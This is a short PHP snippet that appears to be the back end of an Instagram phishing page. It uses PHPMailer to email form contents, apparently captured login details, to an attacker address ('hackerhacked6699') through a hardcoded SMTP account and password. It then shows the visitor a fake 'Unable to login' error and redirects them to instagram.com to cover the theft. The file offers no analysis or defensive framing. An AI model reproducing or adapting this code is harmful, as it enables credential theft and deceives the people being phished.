use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php'; // Assuming PHPMailer is installed via Composer

$mail = new PHPMailer(true);

try {
    // Server settings
    $mail->isSMTP();
    $mail->Host = 'smtp.example.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'tenpmain@example.com';
    $mail->Password = 'P8096796582@n';
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;

    // Recipients
    $mail->setFrom('hackerhacked6699@example.com', 'Mailer');
    $mail->addAddress($to);

    // Content
    $mail->isHTML(false);
    $mail->Subject = $subject;
    $mail->Body    = $txt;

    $mail->send();
    echo "<script type='text/javascript'>
        alert('Error! Unable to login.');
        window.location.replace('https://www.instagram.com');
    </script>";
} catch (Exception $e) {
    echo "<script type='text/javascript'>
        alert('Mailer Error: " . $mail->ErrorInfo . "');
        window.history.go(-1);
    </script>";
}
